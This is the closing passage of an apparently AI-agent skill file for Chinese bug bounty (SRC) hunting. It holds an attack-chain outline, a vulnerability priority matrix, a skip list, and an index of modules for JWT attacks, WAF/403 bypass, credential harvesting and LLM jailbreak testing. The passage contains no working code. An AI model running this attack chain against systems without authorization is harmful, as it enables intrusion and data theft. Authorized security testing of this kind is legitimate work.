    ↓
★ 联动注入（A返回→B输入）+ 泛查询→IDOR→JWT闭环
    ↓
Cross-Phase Feedback (Phase 3.5): 新Token→回溯+前推
    ↓
高危探测(Phase 3.8)→403/405 Bypass(Phase 4)→Triage→PoC→中文.docx Report

并行: Source Leak / Crypto Attack / JWT ↔ 泛查询闭环
```

### 14.2 Priority Matrix

| Priority | What | Why |
|----------|------|-----|
| **P0** | 无auth的 /admin/* /config/* /export/* | 直接数据泄露 |
| **P0** | JS硬编码凭据 (apiKey/secret/JWT Secret) | 直接利用 |
| **P0** | 已知CVE命中 (Shiro/Log4j/Fastjson) | 有公开PoC |
| **P1** | IDOR (值池中有userId) + 泛查询 | 越权+批量泄露高频 |
| **P1** | url/redirect/path → SSRF | 内网穿透 |
| **P1** | 竞态 (优惠券/提现/库存) | 经济价值 |
| **P1** | JWT↔泛查询闭环 | 单点→高危攻击链 |
| **P2** | SQLi / SSTI / CMD 注入 | 需手工验证(Phase 3.8) |
| **P3** | XSS / CSRF / CORS | 需要链式证明impact |

### 14.3 Quick-Filter: Skip Immediately

- Map API keys (Google/Baidu/Amap) → SRC won't accept
- Static directory listing → informational
- Self-XSS without chain → no impact
- CSRF on non-sensitive actions → no impact
- Version disclosure without known CVE → INFO only
- Missing security headers alone → no standalone vuln
- Internal IP leak only → no follow-on path
- UI已展示的数据在API中返回 → 正常业务
- Admin page discovered but 403 → recon finding

---

## 15. Reference Navigation

### Domain Skills (detailed instructions)

| Skill File | Content | Phase |
|-----------|---------|-------|
| `skills/js_analysis/SKILL.md` | JS全量采集+深度分析 (538行) | 0, 1 |
| `skills/data_linkage/SKILL.md` | JS需求表×值池→联动注入+饱和度 | 2 |
| `skills/crypto_attack/SKILL.md` | AES/DES/RSA密钥提取破解 (397行) | 3 |
| `skills/jwt_attack/SKILL.md` | JWT全攻击链 (502行) | 3 |
| `skills/auth_bypass/SKILL.md` | 403/401绕过+CDN/缓存投毒 | 4 |
| `skills/websocket_test/SKILL.md` | WebSocket认证/越权/CSWSH | 5 |
| `skills/race_condition/SKILL.md` | 竞态条件+并发脚本 | 5 |
| `skills/http_smuggling/SKILL.md` | HTTP Request Smuggling | 3 |
| `skills/cache_poisoning/SKILL.md` | Web Cache Poisoning | 3 |
| `skills/prototype_pollution/SKILL.md` | Prototype Pollution | 3 |
| `skills/graphql_test/SKILL.md` | GraphQL全测试 | 2 |
| `skills/oauth_sso/SKILL.md` | OAuth/SSO攻击 | 4 |
| `skills/source_leak/SKILL.md` | GitHub/Gitee源泄露搜索 | 0 |
| `skills/passive_recon/SKILL.md` | crt.sh/wayback/favicon被动收集 | 0 |
| `skills/dependency_cve/SKILL.md` | 依赖版本扫描+CVE匹配 | 0 |
| `skills/vuln_classes/SKILL.md` | 漏洞百科全书 | 5 |
| `skills/api_fuzz/SKILL.md` | API语义化Fuzz Payload模板 | 2 |
| `skills/ai_security/SKILL.md` | AI/LLM Prompt注入/Jailbreak | opt |

### Strategic References (load on-demand)

| Reference File | Content | When to Load |
|---------------|---------|-------------|
| `references/decision-trees.md` | 26个漏洞决策树 (§1-26) + 评级附录 | Phase 2-3, match param to tree |
| `references/fingerprint-mapping.md` | 技术栈指纹→测试映射+WAF签名 | Phase 0 always |
| `references/compliance-rules.md` | SRC合规: 操作分级TIER1/2/3+禁止/替代表+合规声明 | Phase 0 + Phase 5 |
| `references/discovery-amplification.md` | Discovery Amplification 6规则完整示例 | Phase 2 + Phase 3.5 |
| `references/response-chaining.md` | Response→Request链式方法论 | Phase 2-5 always |
| `references/high-risk-probing.md` | Phase 3.8 Steps 1-8详细探测 | Phase 3.8 |
| `references/cve-chains.md` | 已知组件CVE利用(Solr/Druid/OFBiz/Spring) | Phase 0, component matched |
| `references/impact-escalation.md` | 5维影响升级框架 | Phase 5 |
| `references/rating-standard.md` | 阿里SRC 5级评级标准(中文) | Phase 5 |
| `references/vue-spa-attacks.md` | Vue Router 路由穷举+Auth Guard绕过+Store提取+Component树+前端鉴权绕过(响应包修改+路由注入) | Phase 1, Vue detected |
| `references/cloud-attack-surface.md` | OSS/S3/COS Bucket权限测试+NoSuchBucket域名接管+AK/SK利用链 (215行) | Phase 1, OSS URL detected |
| `references/miniprogram-analysis.md` | 小程序解包→审计→API映射 | Phase 1, target has mini-program |
| `references/report-template.md` | Phase 5报告模板: 每条漏洞8项+报告级4项+修复矩阵 | Phase 5 |
| `references/bypass-techniques.md` | WAF/403 bypass快速参考 | LAST RESORT only |
| `references/bug_classes.md` | 10大漏洞类+检测利用技术 | Phase 5 |
| `references/hunt_methodology.md` | 完整侦察→发现→验证→报告方法论 | Phase 0-5 all |

### Agent Files

| Agent File | Role Summary |
|-----------|-------------|
| `agents/recon/SKILL.md` | 信息收集+JS深度分析+Sub-Path SPA+小程序入口 |
| `agents/api_fuzz/SKILL.md` | 全接口覆盖+值池联动+泛查询+Discovery Amplification |
| `agents/crypto_attack/SKILL.md` | 加密/编码/JWT攻击+JWT↔泛查询闭环 |
| `agents/bypass/SKILL.md` | 401/403绕过+WAF Bypass(终手段) |
| `agents/exploit/SKILL.md` | 漏洞利用+FOUND≠CONFIRMED+.docx中文报告+SRC合规 |
| `agents/ai_security/SKILL.md` | AI/LLM安全测试 |

### Scripts

| Script | Hook | Purpose |
|--------|------|---------|
| `scripts/session_context.py` | 1 | Context injection |
| `scripts/coordinator_guard.py` | 2 | Rate-limit + delegation guard |
| `scripts/triage_gate.py` | 3 | 6-check finding validation (incl. data_not_public) |
| `scripts/worklog_recorder.py` | 4 | Dual-channel logging |
| `scripts/retry_detector.py` | 5 | Surrender pattern detection |
| `scripts/handoff_saver.py` | 6 | State serialization |
| `scripts/snow_eyes_inject.js` | — | 雪瞳注入: Vue路由+API+凭据收集 |

---

## 16. Metadata

```yaml
skill_version: 3.1.0
fused: mastermind-bug-bounty v3.0 + vulnforge v0.4.0
last_updated: 2026-05-23
architecture: mastermind-7-hooks + js-driven-data-linkage + safe-first-layering
pipeline_phases: [RECON, API_DISCOVERY, VALUE_LINKAGE, CRYPTO_ATTACK, HIGH_RISK(cond), BYPASS, EXPLOIT]
optional_phases: [AI_SECURITY, MINIPROGRAM]
core_methodology: |
  双通道JS采集（雪瞳+自主探测）
  → 逐文件深度读取 → 完整请求签名提取
  → _endpoint_params.json（接口→参数需求映射表）
  → 全接口覆盖测试 → _leaked_values.json（响应值池）
  → JS需求表 × 值池 → 联动注入（A返回→B输入）
  → 闭环（有饱和度边界时停止，拿到新权限token后重启）
  → Cross-Phase Feedback (Phase 3.5)
  → JWT↔泛查询闭环（泛查询→用户数据→JWT爆破→越权→扩大泛查询）
safe_first_layers:
  - 🟢 安全侦察: Phase 0-1 (被动+JS)
  - 🟡 普通测试: Phase 2-3 (联动+加密)
  - 🔴 高危探测: Phase 3.8 (条件触发)
  - 🚫 WAF绕过: 最终手段
src_compliance:
  - TIER1/2/3操作分级
  - ≤5条数据证明
  - 禁止SQLmap/批量拉取
  - 中文输出+.docx报告
  - FOUND≠CONFIRMED三级分类
  - 非漏洞判定4+1规则
  - 凭证门(Credential Gate)
hooks_implemented: 7/7 (6 original + Pair Completeness Gate v2.4)
domains_covered:
  - Traditional Web (XSS/SQLi/SSRF/CORS/IDOR/SSTI/File Upload/Path Traversal)
  - Modern Web (SPA/Vue/React, API/REST/GraphQL, WebSocket, HTTP Smuggling)
  - Chinese SRC (JD/iFlytek/Ali/Butian compliance + 泛查询 + 小程序)
  - AI/LLM Security (Prompt Injection/Jailbreak/MCP/RAG)
  - Infrastructure (Cloud/Container/CI/CD/Supply Chain)
  - Access Control (403/401 Bypass/Auth Bypass/Privilege Escalation)
  - Reconnaissance (JS Deep Analysis/Source Leak/Tech Fingerprint/Sub-Path SPA)
  - Business Logic (Race Condition/TOCTOU/Amount Tampering/Payment Logic)
```

---

*End of SKILL.md — mastermind-bug-bounty v3.1.0 FUSED*
